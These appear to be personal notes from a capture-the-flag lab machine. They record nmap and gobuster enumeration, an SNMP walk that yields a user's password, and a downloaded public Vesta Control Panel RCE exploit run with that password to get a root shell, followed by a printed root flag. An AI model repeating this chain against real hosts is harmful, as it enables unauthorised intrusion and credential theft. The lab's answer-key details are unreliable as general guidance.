# nmap
```bash
nmap -A -T4 -p 21,22,25,53,80,110,143,465,587,993,995,2525,3306,8080,8083,8443 192.168.165.156                                                                                                                                                                                                                         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 22:53 +0000                                                                                                                                                                                                                                                          
Nmap scan report for 192.168.165.156                                                                                                                                                                                                                                                                                       
Host is up (0.095s latency).                                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                           
PORT     STATE SERVICE  VERSION                                                                                                                                                                                                                                                                                            
21/tcp   open  ftp      vsftpd 3.0.3                                                                                                                                                                                                                                                                                       
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US                                                                                                                                                                                        
| Not valid before: 2022-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_Not valid after:  2023-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                                                         
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                                                                                                                                             
|   2048 7e:62:fd:92:52:6f:64:b1:34:48:8d:1e:52:f1:74:c6 (RSA)                                                                                                                                                                                                                                                             
|   256 1b:f7:0c:c7:1b:05:12:a9:c5:c5:78:b7:2a:54:d2:83 (ECDSA)                                                                                                                                                                                                                                                            
|_  256 ee:d4:a1:1a:07:b4:9f:d9:e5:2d:f6:b8:8d:dd:bf:d7 (ED25519)                                                                                                                                                                                                                                                          
25/tcp   open  smtp     Exim smtpd 4.90_1                                                                                                                                                                                                                                                                                  
|_ssl-date: 2026-03-31T22:54:40+00:00; +21s from scanner time.                                                                                                                                                                                                                                                             
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.244], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP                                                                                                                                                                         
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP                                                                                                                                                                                                                                     
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US                                                                                                                                                                                        
| Not valid before: 2022-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_Not valid after:  2023-11-08T08:16:51                                                                                                                                                                                                                                                                                    
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)                                                                                                                                                                                                                                                         
| dns-nsid:                                                                                                                                                                                                                                                                                                                
|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu                                                                                                                                                                                                                                                                                
80/tcp   open  http     nginx                                                                                                                                                                                                                                                                                              
|_http-title: oscp.exam &mdash; Coming Soon                                                                                                                                                                                                                                                                                
| http-methods:                                                                                                                                                                                                                                                                                                            
|_  Potentially risky methods: TRACE                                                                                                                                                                                                                                                                                       
110/tcp  open  pop3     Dovecot pop3d                                                                                                                                                                                                                                                                                      
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                                                         
|_pop3-capabilities: STLS AUTH-RESP-CODE SASL(PLAIN LOGIN) CAPA UIDL USER RESP-CODES PIPELINING TOP                                                                                                                                                                                                                        
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US                                                                                                                                                                                        
| Not valid before: 2022-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_Not valid after:  2023-11-08T08:16:51                                                                                                                                                                                                                                                                                    
143/tcp  open  imap     Dovecot imapd (Ubuntu)                                                                                                                                                                                                                                                                             
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US                                                                                                                                                                                        
| Not valid before: 2022-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_Not valid after:  2023-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_imap-capabilities: AUTH=LOGINA0001 IMAP4rev1 STARTTLS post-login ENABLE listed Pre-login IDLE OK capabilities have LITERAL+ SASL-IR AUTH=PLAIN more LOGIN-REFERRALS ID                                                                                                                                                   
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                                                                                         
465/tcp  open  ssl/smtp Exim smtpd 4.90_1                                                                                                                                                                                                                                                                                  
|_ssl-date: 2026-03-31T22:55:11+00:00; +52s from scanner time.                                                                                                                                                                                                                                                             
|_smtp-commands: Couldn't establish connection on port 465                                                                                                                                                                                                                                                                 
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US                                                                                                                                                                                        
| Not valid before: 2022-11-08T08:16:51                                                                                                                                                                                                                                                                                    
|_Not valid after:  2023-11-08T08:16:51                                                                                                                                                                                                                                                                                    
587/tcp  open  smtp     Exim smtpd 4.90_1                                                                                                                                                                                                                                                                                  
|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)                                                                                                                                                                                                                                                         
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.244], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2026-03-31T22:52:30+00:00; -1m49s from scanner time.
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: Pre-login AUTH=LOGINA0001 SASL-IR more have post-login OK listed capabilities ID LITERAL+ IMAP4rev1 AUTH=PLAIN ENABLE LOGIN-REFERRALS IDLE
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN LOGIN) CAPA UIDL USER RESP-CODES PIPELINING TOP
2525/tcp open  smtp     Exim smtpd 4.90_1
| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US
| Not valid before: 2022-11-08T08:16:51
|_Not valid after:  2023-11-08T08:16:51
| smtp-commands: oscp.exam Hello nmap.scanme.org [192.168.45.244], SIZE 52428800, 8BITMIME, PIPELINING, AUTH PLAIN LOGIN, CHUNKING, STARTTLS, HELP
|_ Commands supported: AUTH STARTTLS HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
|_ssl-date: 2026-03-31T22:54:34+00:00; +15s from scanner time.
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.40-0ubuntu0.18.04.1
|   Thread ID: 31
|   Capabilities flags: 65535
|   Some Capabilities: ODBCClient, LongColumnFlag, LongPassword, IgnoreSigpipes, Speaks41ProtocolOld, ConnectWithDatabase, FoundRows, SwitchToSSLAfterHandshake, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: |\\x18'b9\x08 \x01HyUYbl=nE%8
|_  Auth Plugin Name: mysql_native_password
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Not valid before: 2022-11-08T08:15:37
|_Not valid after:  2032-11-05T08:15:37
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: oscp.exam &mdash; Coming Soon
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.165.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.29 (Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.14
Network Distance: 4 hops
Service Info: Host: oscp.exam; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -5s, deviation: 1m11s, median: 14s

TRACEROUTE (using port 25/tcp)
HOP RTT      ADDRESS
1   92.84 ms 192.168.45.1
2   92.68 ms 192.168.45.254
3   93.22 ms 192.168.251.1
4   93.76 ms 192.168.165.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.47 seconds

```
## UDP NMAP
```bash
nmap -sU 192.168.165.156
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 17:45 +0000
Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 14.76% done; ETC: 18:00 (0:13:11 remaining)
Stats: 0:13:11 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 79.67% done; ETC: 18:01 (0:03:22 remaining)
Nmap scan report for 192.168.165.156
Host is up (0.098s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT    STATE SERVICE
53/udp  open  domain
161/udp open  snmp
```
## Gobuster

```bash
gobuster dir -u http://192.168.215.156:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.215.156:80
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 1055]
webmail              (Status: 301) [Size: 239] [--> http://192.168.215.156/webmail/]
robots.txt           (Status: 200) [Size: 65]
phpmyadmin           (Status: 301) [Size: 242] [--> http://192.168.215.156/phpmyadmin/]
```

```bash
gobuster dir -u http://192.168.215.156:8080/phpmyadmin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.215.156:8080/phpmyadmin

index.php            (Status: 200) [Size: 10639]
templates            (Status: 301) [Size: 257] [--> http://192.168.215.156:8080/phpmyadmin/templates/]
themes               (Status: 301) [Size: 254] [--> http://192.168.215.156:8080/phpmyadmin/themes/]
themes.php           (Status: 200) [Size: 10640]
doc                  (Status: 301) [Size: 251] [--> http://192.168.215.156:8080/phpmyadmin/doc/]
license.php          (Status: 200) [Size: 10641]
navigation.php       (Status: 200) [Size: 10644]
js                   (Status: 301) [Size: 250] [--> http://192.168.215.156:8080/phpmyadmin/js/]
logout.php           (Status: 200) [Size: 10640]
libraries            (Status: 403) [Size: 1226]
changelog.php        (Status: 200) [Size: 10643]
url.php              (Status: 302) [Size: 0] [--> /phpmyadmin/]
export.php           (Status: 200) [Size: 10640]
setup                (Status: 401) [Size: 381]
Progress: 8786 / 882236 (1.00%)[ERROR] error on word aup: timeout occurred during the request
[ERROR] error on word biz.html: timeout occurred during the request
[ERROR] error on word biz.txt: timeout occurred during the request
[ERROR] error on word 249: timeout occurred during the request
[ERROR] error on word 249.php: timeout occurred during the request
[ERROR] error on word 249.html: timeout occurred during the request
[ERROR] error on word ui: timeout occurred during the request
[ERROR] error on word 249.txt: timeout occurred during the request
[ERROR] error on word 406: timeout occurred during the request
[ERROR] error on word ui.php: timeout occurred during the request
[ERROR] error on word 406.php: timeout occurred during the request
[ERROR] error on word 406.html: timeout occurred during the request
[ERROR] error on word ui.html: timeout occurred during the request
[ERROR] error on word ui.txt: timeout occurred during the request
sql                  (Status: 301) [Size: 251] [--> http://192.168.215.156:8080/phpmyadmin/sql/]
sql.php              (Status: 200) [Size: 10637]
locale               (Status: 301) [Size: 254] [--> http://192.168.215.156:8080/phpmyadmin/locale/]
import.php           (Status: 200) [Size: 10640]
```

## SNMP

```bash
# Enumerate Strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 192.168.165.156

# Identified string: Public

# Enumerate users and passwords
snmpwalk -v2c -c public 192.168.165.156 NET-SNMP-EXTEND-MIB::nsExtendObjects

#Results:
jack:3PUKsX98BMupBiCf
```

## Log into 
https://192.168.165.156:8083
```bash
jack:3PUKsX98BMupBiCf

## Vesta Exploit
https://github.com/CSpanias/vesta-rce-exploit
```bash

#Download
wget https://github.com/CSpanias/vesta-rce-exploit/archive/refs/heads/main.zip

# Exploit
python3 vesta-rce-exploit.py -h                                        

#Results

usage: vesta-rce-exploit.py [-h] target_host username password

#Rerun
python3 vesta-rce-exploit.py https://192.168.165.156:8083/ jack 3PUKsX98BMupBiCf 

#Root Shell Established

# Grab "Jack" Flag
cat /home/jack/local.txt

# Grab "root" Flag
cat /root/proof.txt
7bfb5273d8616e77032c83e62aad4cc3

